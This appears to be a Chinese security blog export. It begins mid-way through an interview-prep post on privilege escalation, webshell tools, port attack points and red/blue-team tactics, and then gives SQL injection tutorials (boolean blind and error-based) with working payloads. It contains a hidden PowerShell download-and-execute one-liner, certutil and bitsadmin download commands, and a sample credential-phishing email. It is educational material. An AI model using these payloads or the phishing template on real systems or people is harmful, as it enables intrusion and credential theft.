<li><p>内核溢出漏洞提权。<br>攻击者利用该漏洞的关键是目标系统没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。</p>
</li>
<li><p>数据库提权。<br>在提权之前，首先要对系统的操作系统信息做一些信息收集。例如，在大多数情况下，当Windows配置为自动登录时，未加密的凭据存储在注册表项中： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</span><br></pre></td></tr></table></figure>
<p> 。PowerUpSQL中的“Get-SQLRecoverPwAutoLogon”函数可以获取到默认Windows自动登录信息和备用Windows自动登录信息（如果已设置），然后它返回相关的域名，用户名和密码。</p>
</li>
<li><p>系统配置错误提权。<br>在windows操作系统中，黑客通常会通过系统内核溢出漏洞来提权，但是在行不通的情况下，就会利用系统的错误配置来提权。windows操作系统中的常见配置错误包括：管理员凭证配置错误、服务配置错误、故意削弱的安全措施和用户权限过高。</p>
</li>
<li><p>组策略首选项提权。<br>组策略首选项提权是一种利用Windows组策略首选项来提升权限的方法。Windows 2008 Server引入了一项称为组策略首选项的新功能，该功能使管理员可以部署影响域中计算机&#x2F;用户的特定配置。通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员帐户的用户名或对注册表进行更改。（2014已修复）</p>
</li>
<li><p>Bypass UAC提权。<br>实现Bypass UAC的方法主要有两种方法：一种是利用白名单提权机制，另一种是利用COM组件接口技术。例如，可以利用CompMgmtLauncher.exe白名单程序Bypass UAC提权。程序自己创建并添加注册表HKCUSoftwareClassesmscfileshellopencommand (Default)，并写入自定义的程序路径。此外，还有其他几种绕过UAC的方法，包括DLL劫持、Windows自身漏洞提权、远程注入等。（UAC是User Account Control（用户帐户控制）的缩写。它是一种Windows操作系统中的安全功能，旨在防止未经授权的更改，这些更改可能会影响计算机的运行或用户数据。当程序尝试执行需要管理员权限的操作时，UAC会弹出一个提示框，要求用户确认操作。）</p>
</li>
<li><p>令牌窃取提权。<br>令牌窃取提权是一种利用Windows访问令牌来提升权限的方法。Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌以使正在运行的进程看起来像它属于启动该进程的用户以外的其他人。发生这种情况时，该过程还将采用与新令牌关联的安全性上下文。</p>
</li>
<li><p>第三方软件&#x2F;服务提权</p>
</li>
</ol>
<p>Reference article:<br><a href="https://www.secpulse.com/archives/189368.html">Windows提权基础</a><br><a href="https://www.freebuf.com/articles/system/338877.html">Window常见提权方法一览</a></p>
<h2 id="蚁剑-x2F-菜刀-x2F-C刀-x2F-冰蝎的相同与不同之处"><a href="#蚁剑-x2F-菜刀-x2F-C刀-x2F-冰蝎的相同与不同之处" class="headerlink" title="蚁剑&#x2F;菜刀&#x2F;C刀&#x2F;冰蝎的相同与不同之处"></a>蚁剑&#x2F;菜刀&#x2F;C刀&#x2F;冰蝎的相同与不同之处</h2><p>相同之处：都是webshell的管理工具。<br>不同之处：<br>菜刀：流量base64编码，特征比较固定<br>蚁剑：支持自定义加密，但是shell不稳定，且对jsp兼容性差<br>冰蝎：流量动态AES加密，流量比较隐蔽，但是兼容性相对较差，需要匹配服务器后端语言版本</p>
<h2 id="Windows环境下有哪些下载文件的命令"><a href="#Windows环境下有哪些下载文件的命令" class="headerlink" title="Windows环境下有哪些下载文件的命令"></a>Windows环境下有哪些下载文件的命令</h2><ol>
<li><p>PowerShell<br>PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。<br>远程下载文件到本地（下载路径为当前所处路径）：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell (new-object System.<span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;URL&#x27;,&#x27;Filename&#x27;)</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;URL&#x27;))&quot;</span><br></pre></td></tr></table></figure>

</li>
<li><p>certutil<br>certutil.exe是一个命令行程序，作为证书服务的一部分安装，可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。<br>远程下载文件到本地：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f &lt;URL&gt; &lt;FilePath&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>bitsadmin<br>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。<br>远程文件下载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n &lt;URL&gt; &lt;FilePath\Filename&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>FTP</p>
</li>
<li><p>TFTP</p>
</li>
<li><p>cURL<br>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具，cURL还包含了用于程序开发的libcurl。<br>远程下载文件到本地：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &lt;URL&gt; -o Filename</span><br></pre></td></tr></table></figure>
</li>
<li><p>wget</p>
</li>
<li><p>ncat</p>
</li>
<li><p>python</p>
</li>
</ol>
<p><a href="https://xz.aliyun.com/t/7937#toc-2">windows&#x2F;Linux文件下载方式汇总</a></p>
<h2 id="常见的端口号？攻击点？"><a href="#常见的端口号？攻击点？" class="headerlink" title="常见的端口号？攻击点？"></a>常见的端口号？攻击点？</h2><ol>
<li><p>ftp:20,21<br>匿名文件下载、嗅探、爆破</p>
</li>
<li><p>ssh:22<br>弱口令、暴力猜解、用户名枚举<br>1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，2、利用弱口令&#x2F;暴力破解，获取目标主机权限。</p>
</li>
<li><p>telnet:23<br>弱口令、明文传输<br>1、通过弱口令或暴力破解，获取目标主机权限。2、嗅探抓取telnet明文账户密码。</p>
</li>
<li><p>sql server:1433<br>注入、弱口令、爆破</p>
</li>
<li><p>orcle database:1521<br>注入、弱口令、爆破</p>
</li>
<li><p>RMI:1090&#x2F;1099<br>JAVA RMI 反序列化远程命令执行漏洞<br>使用nmap检测端口信息。</p>
</li>
<li><p>RDP:3389<br>暴力破解<br>通过弱口令或暴力破解，获取目标主机权限。</p>
</li>
<li><p>VNC:5900<br>弱口令、暴力破解<br>通过弱口令或暴力破解，获取目标主机权限。</p>
</li>
<li><p>Redis database:6379<br>未授权访问、弱口令爆破</p>
</li>
<li><p>Weblogic:7001<br>弱口令、SSRF、反序列化漏洞<br>1、控制台弱口令上传war木马2、SSRF内网探测3、反序列化远程代码执行等</p>
</li>
<li><p>Zabbix:8069<br>远程命令执行</p>
</li>
<li><p>Tomcat:8080<br>弱口令、示例目录<br>通过弱口令登录控制台，上传war包。</p>
</li>
<li><p>JBoss:8080<br>未授权访问、反序列化<br>1、未授权访问控制台，远程部署木马2、反序列化导致远程命令执行等。</p>
</li>
</ol>
<h2 id="木马驻留系统的方式有哪些？"><a href="#木马驻留系统的方式有哪些？" class="headerlink" title="木马驻留系统的方式有哪些？"></a>木马驻留系统的方式有哪些？</h2><ol>
<li>注册表</li>
<li>关联类型文件</li>
<li>服务</li>
<li>启动目录</li>
<li>计划任务</li>
</ol>
<h2 id="常用的威胁情报平台"><a href="#常用的威胁情报平台" class="headerlink" title="常用的威胁情报平台"></a>常用的威胁情报平台</h2><ol>
<li><a href="virustotal.com">Virustotal</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/">IBM X-Force</a></li>
<li><a href="https://isc.sans.edu/">SANS互联网风暴中心</a></li>
<li><a href="https://x.threatbook.com/">微步威胁情报中心</a></li>
<li><a href="https://ti.360.net/">360威胁情报中心</a></li>
<li><a href="https://ti.qianxin.com/">奇安信威胁情报中心</a></li>
<li><a href="https://nti.nsfocus.com/">绿盟威胁情报中心</a></li>
<li><a href="https://ti.dbappsecurity.com.cn/">安恒威胁情报中心</a></li>
<li><a href="https://www.venuseye.com.cn/">VenusEye威胁情报中心</a></li>
</ol>
<h2 id="常用的webshell检测工具"><a href="#常用的webshell检测工具" class="headerlink" title="常用的webshell检测工具"></a>常用的webshell检测工具</h2><ol>
<li>D盾 – 防火墙（免费，GUI，WebShell 扫描检测查杀。支持系统:win2003&#x2F;win2008&#x2F;win2012&#x2F;win2016）</li>
<li>WEBDIR+ – 百度Webshell扫描检测引擎（免费，Shell 在线检测查杀）</li>
<li>WebShell Detector – Webshell扫描器（免费，在线检测查杀）</li>
<li>WebShell.pub – 河马查杀（免费，GUI &#x2F; 在线 WebShell 扫描检测查杀）</li>
<li>PHP Malware Finder – webshell扫描查杀（免费，全平台，本地）</li>
<li>CloudWalker – Webshell扫描检测引擎（免费，全平台支持，线上线下）</li>
<li>Sangfor WebshellKill – web后门专杀工具（支持Windows、linux，本地）</li>
</ol>
<h2 id="一般情况下，哪些漏洞会高频用于打点？"><a href="#一般情况下，哪些漏洞会高频用于打点？" class="headerlink" title="一般情况下，哪些漏洞会高频用于打点？"></a>一般情况下，哪些漏洞会高频用于打点？</h2><ol>
<li>Apache Shiro相关漏洞</li>
<li>Fastjson漏洞</li>
<li>Log4j</li>
<li>上传漏洞</li>
<li>边界网络设备资产+弱口令</li>
</ol>
<h2 id="Windows常用命令"><a href="#Windows常用命令" class="headerlink" title="Windows常用命令"></a>Windows常用命令</h2><p>type：显示文件类型<br>dir：显示当前目录<br>ipconfig：查看ip地址<br>net user ：查看用户<br>netstat：查看端口<br>tasklist：查看进程列表<br>find：文件中搜索字符串<br>ping：检测网络连通情况</p>
<h2 id="应急响应的基本思路是什么？"><a href="#应急响应的基本思路是什么？" class="headerlink" title="应急响应的基本思路是什么？"></a>应急响应的基本思路是什么？</h2><p>准备-检测-抑制-根除-恢复-书写报告</p>
<ol>
<li>准备工作，收集信息：收集告警信息、客户反馈信息、设备主机信息等。</li>
<li>检测，判断类型：安全事件类型的判断（钓鱼邮件，webshell，爆破，中毒等）</li>
<li>抑制，控制范围，隔离失陷设备</li>
<li>根除，分析研判，将收集的信息分析</li>
<li>恢复，处置事件类型（进程、文件、邮件、启动项，注册表等）</li>
<li>输出报告</li>
</ol>
<h2 id="Linux常用的命令？"><a href="#Linux常用的命令？" class="headerlink" title="Linux常用的命令？"></a>Linux常用的命令？</h2><p>cat ：显示文件内容<br>ls：列出当前目录的内容<br>ifconfig：查看IP地址<br>whoami：查看当前用户<br>netstat：查看端口<br>ps：查看进程列表<br>grep：文件中搜索字符串<br>ping：检测网站连接情况<br>crontal：检查定时任务</p>
<h2 id="蓝队常用的反制手段有哪些？"><a href="#蓝队常用的反制手段有哪些？" class="headerlink" title="蓝队常用的反制手段有哪些？"></a>蓝队常用的反制手段有哪些？</h2><p>1、蜜罐（蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。）<br>2、对攻击目标进行反渗透（IP定位、IP端口扫描、web站点扫描）<br>3、应用漏洞挖掘&amp;利用（菜刀、Goby、蚁剑）<br>4、id—-&gt; 社交特征关联<br>5、钓鱼网站–&gt;后台扫描、xss盲打<br>6、木马文件—&gt;同源样本关联—-&gt;敏感字符串特侦检测<br>(反钓鱼也逐渐被蓝队重视，通过在服务器上故意放置钓鱼文件，吸引红队主动下载安装，完成反钓鱼。)</p>
<h2 id="红队攻击手法简要介绍"><a href="#红队攻击手法简要介绍" class="headerlink" title="红队攻击手法简要介绍"></a>红队攻击手法简要介绍</h2><h3 id="红队第一招-信息收集"><a href="#红队第一招-信息收集" class="headerlink" title="红队第一招-信息收集"></a>红队第一招-信息收集</h3><p>资产挖掘（子域名、目录、后台、服务、高位端口应用)<br>Github、Google Hacking等<br>企业信息(办公地点、投资者关系、上下游企业等)<br>企业员工信息收集（百度、微博、邮箱、子号等)<br>Goby网络安全测试工具</p>
<p>Masscan(最快的互联网端口扫描器)</p>
<p>Nmap(网络连接扫描工具)</p>
<p>Oneforall(子域名收集)</p>
<h3 id="红队第二招-web漏洞攻击"><a href="#红队第二招-web漏洞攻击" class="headerlink" title="红队第二招-web漏洞攻击"></a>红队第二招-web漏洞攻击</h3><p>中间件漏洞攻击（IIS、Nginx解析漏洞、RCE等)<br>第三方组件、框架漏洞攻击(Java反序列化、Struts2 RCE、CMS Oday等)<br>常规WEB技术漏洞攻击(SQLi、XSS、XXE、SSRF、SSJs等)<br>逻辑漏洞(认证缺陷，如:后台弱口令、登录表单可暴力破解、密码找回绕过、短信认证功能缺陷等)</p>
<h3 id="红队第三招-水坑攻击"><a href="#红队第三招-水坑攻击" class="headerlink" title="红队第三招-水坑攻击"></a>红队第三招-水坑攻击</h3><p>水坑攻击（英语: Watering hole)是一种计算机入侵手法，其针对的目标多为特定的团体（组织、行业、地区等)。攻击者首先通过猜测（或观察）确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。<br>由于此种攻击借助了目标团体所信任的网站，攻击成功率很高，即便是那些对鱼叉攻击或其他形式的网络钓鱼具有防护能力的团体。</p>
<p>利用条件及具备因素:<br>需要知道目标经常访问的网站;这个网站需要有可利用的漏洞;<br>利用漏洞后需要和原网站样式一致，不引起目标的警觉;使用免杀技术。<br>怎么利用:</p>
<p>(1）通过信息搜集掌握目标的习惯或访问历史<br>(2）从访问历史中查找可利用的站点<br>(3）精心编写exp，进行UI设计，加入免杀功能，然后在本地进行验证<br>(4）利用站点的漏洞，通过JS或html重写将payload插入目标站点，并诱使用户下载<br>(5)攻击者在本地启用监听，等待目标执行exp<br>为什水坑攻击的成功率高:<br>目标的必经之路;<br>迷惑性极高，不易察觉。<br>做了一件什么事情:利用用户经常访问的站点上的漏洞，挂载恶意程序，诱使用户点击执行。</p>
<p>如何防御水坑攻击</p>
<p>1.定期检查员工访问量最大的网站是否存在恶意软件;<br>2.阻止访问所有受感染站点;<br>3.设置浏览器和工具，以利用网站信誉让用户知道不良网站;<br>4.在允许访问这些站点之前，请检查所有来自第三方和外部站点的所有流量并进行验证;<br>5.为了帮助进行验证并增强网络安全状况，建议采用包括威胁检测在内的多种方法。</p>
<h3 id="红队第四招-网络钓鱼邮件-社会工程学"><a href="#红队第四招-网络钓鱼邮件-社会工程学" class="headerlink" title="红队第四招-网络钓鱼邮件(社会工程学)"></a>红队第四招-网络钓鱼邮件(社会工程学)</h3><p>邮件主题:【通知】账号密码修改温馨提示发件人:<code>usercenter@163.com</code><br>收件人:<code>xxxy@.com.cn</code><br>邮件正文:<br>亲爱的同事，您好:<br>根据公司安全管理规定，域账户近期进行统一重置为强度更高的密码。届时我们会通过邮件发送您的新密码，您的WIFI、邮箱、OA等可自动完成密码同步。<br>为了保证您的账户”xxXy”密码能够顺利重置，请尽快回复本邮件，并填写以下信息:姓名:【必填】<br>职位:【必填】工号:【必填】邮箱:【必填】密码:【必填】手机号:【必填】<br>IT运维中心2022年5月28日</p>
<h3 id="红队第五招-木马免杀"><a href="#红队第五招-木马免杀" class="headerlink" title="红队第五招-木马免杀"></a>红队第五招-木马免杀</h3><p>又叫免杀毒技术，是反病毒，反间谍的对立面，是一种能使病毒或木马免于被杀毒软件查杀的软件。它除了使病毒木马免于被查杀外，还可以扩增病毒木马的功能，改变病毒木马的行为。免杀的基本特征是破坏特征，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。免杀技术也并不是十恶不赦的，例如，在软件保护所用的加密产品(比如壳)中，有一些会被杀毒软件认为是木马病毒;一些安全领域中的部分安全检测产品，也会被杀毒软件误杀，这时就需要免杀技术来应对这些不稳定因素。</p>
<h3 id="值得关注的攻击队伍"><a href="#值得关注的攻击队伍" class="headerlink" title="值得关注的攻击队伍:"></a>值得关注的攻击队伍:</h3><p>永信:攻防平台厂商，去年得分很高，公安御用团队，实战经验多，手握多个0day<br>长亭:WAF厂商，开源X-ray漏扫，web攻防经验丰富，核心团队能力拔群。<br>阿里:大厂有钱有人，对开源和商业产品研究深入，善于供应链攻击，全员出动支援。<br>腾讯:大厂有钱有人，常年CTF世界冠军，挖通用漏洞能力超强，Oday存货多，能打还能防。<br>奇安信:全线产品厂商，最了解甲方的团队之一，公安御用团队，实战经验多，攻击套路深。<br>安恒:全线产品厂商，最了解甲方的团队之一，公安御用团队，实战经验多，刷1day能力强。<br>360:大厂有钱有人，0day军火库，公安御用团队，实战经验多，打起来没啥顾忌，今年不参加。<br>总结:有钱，有人，常打，御用，支援足，有Oday，套路深，较谨慎，熟悉甲方，信息收集做得好。</p>
<h3 id="值得关注的安全产品"><a href="#值得关注的安全产品" class="headerlink" title="值得关注的安全产品:"></a>值得关注的安全产品:</h3><p>HIDS:服务器端点侧信息采集与异常监测。重点关注:资产（IP、操作系统、组件、帐号)、后门检测、webshell检测、弱口令检测、高危端口检测、异常登录检测、异常命令检测、异常进程检测…<br>NTA:网络流量解析与监测分析。重点关注:扫描探测、Oday漏洞攻击、webshell上传、webshell利用、木马&#x2F;后门、异常连接、隐蔽隧道、威胁情报、暴力破解、口令猜解…<br>WAF:应用侧攻击监测与阻断。重点关注:各类注入、绕过、未授权访问、反序列化、溢出、目录遍历、信息泄露…<br>蜜罐:欺骗攻击者的各种技术手段。重点关注:WAF引流、蜜罐应用、蜜罐主机（关键区域)、蜜罐AD帐号、蜜罐wiki、蜜罐VPN、蜜罐FTP、蜜罐集权应用、蜜罐数据&#x2F;文件、蜜罐客户端、溯源…<br>告警&#x2F;日志分析:对告警和日志的分析工具。重点关注:资产快速定位、日志接入、日志解析、日志存储、日志快速查询、日志导出…<br>总结:纵深+诱骗+分析，全面覆盖+重点部署，规则快速配置+快速分析定位。</p>
<h3 id="护网中值得关注的前置防护手段"><a href="#护网中值得关注的前置防护手段" class="headerlink" title="护网中值得关注的前置防护手段"></a>护网中值得关注的前置防护手段</h3><p>IP封堵:如何在防火墙和WAF上快速的封堵IP，最好自动化，注意解封时间的设定…<br>钓鱼演练:至少三轮集中钓鱼演练，通知+不通知，链接+附件+伪造邮件头+内容欺诈…<br>非关键应用提前下线:梳理资产，提前下线非关键应用，顺带下线内部wiki、闲置主机…<br>关键、集权应用、AD监控:梳理AD、集权应用和关键应用，增加对应的监控手段，部署蜜罐应用或帐做好应急事件处置策略…<br>告警收敛:提前制定规则，避免遭到告警洪流，内部测试最好停止，增加白名单，最好发版管控…<br>权限收敛:办公、测试、生产间的访问权限收敛，避免开大策略<br>加强监控,可考虑报备机制…<br>xff配置:负载均衡一定要配置xff，否则告警没法看到真实IP…<br>信息收集:针对攻防平台、攻击队人员和厂商支援力量的信息收集，包括但不限于:姓名、微信号、手机号、ID、IP地理位置、IDC机房IP段、网络测绘、常见攻防工具、攻击偏好…</p>
]]></content>
      <categories>
        <category>护网</category>
        <category>面试</category>
      </categories>
      <tags>
        <tag>护网</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>布尔盲注</title>
    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
<span id="more"></span>

<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>

<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>

<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
<li><p>判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
</li>
<li><p>取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>说明：如果写脚本，采用二分法更佳</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>布尔盲注</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>报错注入常用函数</title>
    <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
<span id="more"></span>

<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ol>
<li>格式<br>updatexml(XML_document,XPath_string,new_value)</li>
</ol>
<ul>
<li>XML_document: xml标记</li>
<li>XPath_string: 显示输入语句</li>
<li>new_value: 新值</li>
<li>输出字符长度限制为32个字符</li>
<li>适用版本：5.1.5以上</li>
</ul>
<ol start="2">
<li>原理<br>updatexml()函数是MySQL对XML文档数据进行查询和修改的XPATH函数：</li>
</ol>
<ul>
<li>xml:可扩展语言</li>
<li>update():函数更新</li>
<li>组合，具有查询功能的函数，用于查询xpath<br>利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到查询内容的目的</li>
</ul>
<ol start="3">
<li>示例<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)</li>
</ol>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ol>
<li><p>格式<br>extractvalue(XML_document,XPath_string):<br>XML_document是string格式，为XML文档对象的名称<br>XPath_string(Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串</p>
</li>
<li><p>原理</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a/b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>该语句是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误，就会报错</p>
</li>
</ol>
<ul>
<li>输出字符长度限制为32个字符</li>
<li>适用版本：5.1.5以上</li>
</ul>
<ol start="3">
<li>示例<br>extractvalue(1,concat(0x7e,(select database())))</li>
</ol>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><ol>
<li>格式<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(payload,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>payload是需要插入sql注入语句的位置</li>
<li>floor():去除小数部分</li>
<li>rand():产生随机数</li>
<li>rand(x):每个x对应一个固定的值，连续执行多次值会变化，但可预测，序列为011011…</li>
<li>count():count(*)函数返回表中的记录数</li>
<li>适用版本：5.0 &lt; MySQL &lt; 8.x</li>
</ul>
<ol start="2">
<li><p>原理<br>利用数据库表主键不能重复的原理，使用group by分组，产生主键key冗余，导致报错<br>详细解释：<a href="https://blog.csdn.net/qq_43504939/article/details/90046342">SQL注入:floor()报错注入</a></p>
</li>
<li><p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><p><a href="https://blog.csdn.net/qq_43238111/article/details/106205125">报错注入常用函数</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/GTL-JU/p/16054806.html">报错注入常用的三种注入方式</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_46706771/article/details/112768348">MYSQL 通过ExtractValue()报错注入</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>报错注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>搖曳露营movie--仰望星空的童话</title>
    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
<span id="more"></span>

